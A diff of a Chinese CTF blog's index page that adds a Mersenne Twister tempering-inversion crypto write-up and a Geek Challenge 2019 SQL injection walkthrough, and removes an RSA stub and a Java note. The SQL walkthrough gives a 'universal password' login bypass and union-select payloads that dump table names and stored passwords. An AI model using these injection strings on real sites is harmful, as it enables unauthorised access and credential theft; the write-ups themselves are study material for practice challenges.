@@ -430,6 +430,237 @@
         
           
   <h2 class="title">
+    <a href="/2020/08/09/mt-SUCTF/">
+      mt[SUCTF]
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="" rel="nofollow">
+    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
+    <p>omp</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/BUU%E5%88%B7%E9%A2%98/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>BUU刷题</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 9, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>学习出处:<a href="https://liam.page/2018/01/12/Mersenne-twister/" target="_blank" rel="noopener">https://liam.page/2018/01/12/Mersenne-twister/</a></p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">transformed_flag = transform(flag[<span class="number">5</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'transformed_flag:'</span>, transformed_flag</span><br><span class="line"><span class="comment"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="逆提取算法"><a href="#逆提取算法" class="headerlink" title="逆提取算法"></a>逆提取算法</h3><h4 id="向右移位异或"><a href="#向右移位异或" class="headerlink" title="向右移位异或"></a>向右移位异或</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result=value^value&gt;&gt;shift</span><br></pre></td></tr></table></figure>
+
+<p>result的前shift位和value相同</p>
+<p>使用比特遮罩或截取result的前shift位得到value的前shift位</p>
+<p>tmp=value&gt;&gt;shift</p>
+<p>由此可以得到tmp的前shift<em>2位 与result异或 得到value的前shift\</em>2位</p>
+<p>循环往复，可以得到value</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span><span class="params">(result, shift)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits &lt;&lt; (<span class="number">32</span> - shift)) &amp; kMaxBits)&gt;&gt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=part&gt;&gt;shift</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>
+
+<h4 id="向左移位异或"><a href="#向左移位异或" class="headerlink" title="向左移位异或"></a>向左移位异或</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result=value^value&lt;&lt;shift&amp;mask</span><br></pre></td></tr></table></figure>
+
+<p>tmp=value&lt;&lt;shift</p>
+<p>同理，result的后shift位与value相同，比特遮罩取后shift位</p>
+<p>可知value的前shift*2位</p>
+<p>循环往复</p>
+<p>与右移不同的是此处mask取对应的位，逆算法中也要取相应的位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(result,shift,mask)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits&gt;&gt;(<span class="number">32</span>-shift)&amp;kMaxBits))&lt;&lt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=(part&lt;&lt;shift)&amp;mask</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">kMaxBits = <span class="number">0xffffffff</span></span><br><span class="line">c1 = <span class="number">0x641460a9</span></span><br><span class="line">c2 = <span class="number">0xe3953b1a</span></span><br><span class="line">c3 =<span class="number">0xaa21f3a2</span></span><br><span class="line">c=<span class="string">'641460a9e3953b1aaa21f3a2'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span><span class="params">(result, shift)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits &lt;&lt; (<span class="number">32</span> - shift)) &amp; kMaxBits)&gt;&gt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=part&gt;&gt;shift</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(result,shift,mask)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits&gt;&gt;(<span class="number">32</span>-shift)&amp;kMaxBits))&lt;&lt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=(part&lt;&lt;shift)&amp;mask</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = right(m, <span class="number">19</span>)</span><br><span class="line">    m = left(m, <span class="number">17</span>, <span class="number">2245263360</span>)</span><br><span class="line">    m = left(m, <span class="number">9</span>, <span class="number">2029229568</span>)</span><br><span class="line">    m = right(m, <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">s1=hex(decrypt(c1))[<span class="number">2</span>:]</span><br><span class="line">s2=hex(decrypt(c2))[<span class="number">2</span>:]</span><br><span class="line">s3=hex(decrypt(c3))[<span class="number">2</span>:]</span><br><span class="line">print(s1+s2+s3)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+      sql注入[极客大挑战]
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="" rel="nofollow">
+    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
+    <p>omp</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/web/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>web</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 5, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>发现username和password都能注入，使用万能密码</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806150937579.png" alt="image-20200806150937579"></p>
+<p>万能密码学习：<a href="https://blog.csdn.net/weixin_43952190/article/details/105696239" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43952190/article/details/105696239</a></p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>按照上一题的思路万能密码得到admin的密码(但是好像并没有什么用emm</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806151229803.png" alt="image-20200806151229803"></p>
+<p>判断字段为3</p>
+<p>?username=admin’ order by 4%23&amp;password=1</p>
+<p>注意:这里的注释#在输入框中输入时可以用#，而在地址栏时必须是%23</p>
+<p>使用union查询发现2,3字段处显示数据</p>
+<p>注意:注入时不能使用admin,2,3位置会显示admin的数据</p>
+<p>答疑：为什么使用错误的username和password也会显示login success</p>
+<p>代码可能是这样写的：只要能查出结果，就能成功登录</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806152232415.png" alt="image-20200806152232415"></p>
+<p>(感谢我伟大的web队友)</p>
+<p>得到数据库名geek</p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806152437389.png" alt="image-20200806152437389"></p>
+<p>?username=1’ union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=database()%23&amp;password=1</p>
+<p>得到两张表’geekuser,l0ve1ysq1’</p>
+<p>?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p>
+<p>得到表’10ve1ysq1’的字段id,username和password</p>
+<p>?username=1’ union select 1,2,group_concat(password) from l0ve1ysq1%23&amp;password=1</p>
+<p>得到password，包含flag</p>
+
+      
+    </div>
+    
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
     <a href="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/">
       随便注[强网杯]
     </a>
@@ -1343,207 +1574,6 @@
           </div>
         
       
-        
-          <div class='post-wrapper'>
-            <article class="post white-box shadow reveal ">
-  
-
-
-  <section class='meta'>
-    
-      
-      
-      <div class="meta" id="header-meta">
-        
-          
-  <h2 class="title">
-    <a href="/2020/05/17/NPUCTFWP/">
-      WP
-    </a>
-  </h2>
-
-
-        
-        <div class='new-meta-box'>
-          
-            
-          
-            
-              
-<div class='new-meta-item author'>
-  <a href="" rel="nofollow">
-    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
-    <p>omp</p>
-  </a>
-</div>
-
-            
-          
-            
-              
-
-            
-          
-            
-              <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：May 17, 2020</p>
-  </a>
-</div>
-
-            
-          
-            
-              
-
-            
-          
-            
-              
-
-            
-          
-        </div>
-        
-          <hr>
-        
-      </div>
-    
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="认清形势，建立信心"><a href="#认清形势，建立信心" class="headerlink" title="认清形势，建立信心"></a>认清形势，建立信心</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br></pre></td></tr></table></figure>
-
-<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
-<li>求解DLP</li>
-<li>扩展CRT</li>
-</ul>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3>
-      
-    </div>
-    
-      
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post white-box shadow reveal ">
-  
-
-
-  <section class='meta'>
-    
-      
-      
-      <div class="meta" id="header-meta">
-        
-          
-  <h2 class="title">
-    <a href="/2020/05/05/java%E5%AD%A6%E4%B9%A02/">
-      java学习(2)
-    </a>
-  </h2>
-
-
-        
-        <div class='new-meta-box'>
-          
-            
-          
-            
-              
-<div class='new-meta-item author'>
-  <a href="" rel="nofollow">
-    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
-    <p>omp</p>
-  </a>
-</div>
-
-            
-          
-            
-              
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/java/' rel="nofollow">
-      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <p>java</p>
-    </a>
-  </div>
-
-
-            
-          
-            
-              <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：May 5, 2020</p>
-  </a>
-</div>
-
-            
-          
-            
-              
-
-            
-          
-            
-              
-
-            
-          
-        </div>
-        
-          <hr>
-        
-      </div>
-    
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="关于protected权限的子类访问方式"><a href="#关于protected权限的子类访问方式" class="headerlink" title="关于protected权限的子类访问方式"></a>关于protected权限的子类访问方式</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>听老师讲课说到Object类的clone()方法，其声明方法是protected修饰的。protected修饰的可见性在本类，同包类，子类中皆可见。但子类clone()方法使用时，却不能直接调用Object类的clone()方法，而是需要进行重写,这个问题令我很迷茫。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object clone() throws CloneNotSupportedException&#123;</span><br><span class="line">              return super.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h2><p>学习出处：<br><a href="https://blog.csdn.net/blacktal/article/details/81198579" target="_blank" rel="noopener">https://blog.csdn.net/blacktal/article/details/81198579</a><br><a href="https://blog.csdn.net/asahinokawa/article/details/80777302" target="_blank" rel="noopener">https://blog.csdn.net/asahinokawa/article/details/80777302</a><br>通过学习我认识到，protected修饰并不只是被同一包中的所有类和不同包中的子类访问那么简单。<br>直接总结一下，详细实例看出处</p>
-<ol>
-<li><p>子类可以通过继承获得不同包父类的protected权限成员变量和成员方法，在子类中可以直接访问</p>
-</li>
-<li><p>在子类中可以通过子类的对象访问父类的protected成员变量和方法</p>
-</li>
-<li><p>在子类中反而<strong>不能</strong>通过父类的对象实例访问父类的protected成员变量和方法</p>
-</li>
-<li><p>在子类中不能通过其他子类的对象访问父类的protected成员变量和方法</p>
-</li>
-<li><p>在与子类同包的其他类中不能通过子类的对象访问父类的protected成员变量和方法</p>
-</li>
-</ol>
-<p>子类可以在自己这里直接调用父类protected修饰的成员变量和方法，但是若在别的类中使用<code>子类.clone()</code>，protected修饰的就不可见(同第5条)</p>
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>所以为了能在其他类中调用clone()方法，必须通过<strong>在子类中重写把clone()方法的权限提升并且实现Cloneable接口</strong><br>在自定义子类A类体中调用Object的clone()方法的问题不再讨论，不能这么使用</p>
-
-      
-    </div>
-    
-      
-    
-  </section>
-</article>
-
-          </div>
-        
-      
     
   </section>
   
@@ -1659,7 +1689,7 @@
           <li><a class="flat-box"
             title="/categories/BUU%E5%88%B7%E9%A2%98/" href="/categories/BUU%E5%88%B7%E9%A2%98/"
             id="categoriesBUUE588B7E9A298"
-            ><div class='name'>BUU刷题</div><div class='badge'>(3)</div></a></li>
+            ><div class='name'>BUU刷题</div><div class='badge'>(4)</div></a></li>
         
           <li><a class="flat-box"
             title="/categories/CTF/" href="/categories/CTF/"
@@ -1674,7 +1704,7 @@
           <li><a class="flat-box"
             title="/categories/web/" href="/categories/web/"
             id="categoriesweb"
-            ><div class='name'>web</div><div class='badge'>(1)</div></a></li>
+            ><div class='name'>web</div><div class='badge'>(2)</div></a></li>
         
           <li><a class="flat-box"
             title="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"
@@ -1708,7 +1738,7 @@
 
 
     <div class='content'>
-      <a href="/tags/AES/" style="font-size: 19px; color: #777">AES</a> <a href="/tags/DLP/" style="font-size: 19px; color: #777">DLP</a> <a href="/tags/ECC/" style="font-size: 14px; color: #999">ECC</a> <a href="/tags/RC4/" style="font-size: 14px; color: #999">RC4</a> <a href="/tags/RSA/" style="font-size: 24px; color: #555">RSA</a> <a href="/tags/java/" style="font-size: 19px; color: #777">java</a> <a href="/tags/knapsack/" style="font-size: 19px; color: #777">knapsack</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/stream/" style="font-size: 14px; color: #999">stream</a> <a href="/tags/%E6%89%A9%E5%B1%95CRT/" style="font-size: 14px; color: #999">扩展CRT</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 24px; color: #555">杂项</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #999">编码</a>
+      <a href="/tags/AES/" style="font-size: 19px; color: #777">AES</a> <a href="/tags/DLP/" style="font-size: 19px; color: #777">DLP</a> <a href="/tags/ECC/" style="font-size: 14px; color: #999">ECC</a> <a href="/tags/RC4/" style="font-size: 14px; color: #999">RC4</a> <a href="/tags/RSA/" style="font-size: 24px; color: #555">RSA</a> <a href="/tags/java/" style="font-size: 19px; color: #777">java</a> <a href="/tags/knapsack/" style="font-size: 19px; color: #777">knapsack</a> <a href="/tags/mt19937/" style="font-size: 14px; color: #999">mt19937</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 19px; color: #777">sql注入</a> <a href="/tags/stream/" style="font-size: 14px; color: #999">stream</a> <a href="/tags/%E6%89%A9%E5%B1%95CRT/" style="font-size: 14px; color: #999">扩展CRT</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 24px; color: #555">杂项</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #999">编码</a>
     </div>
   </section>
 
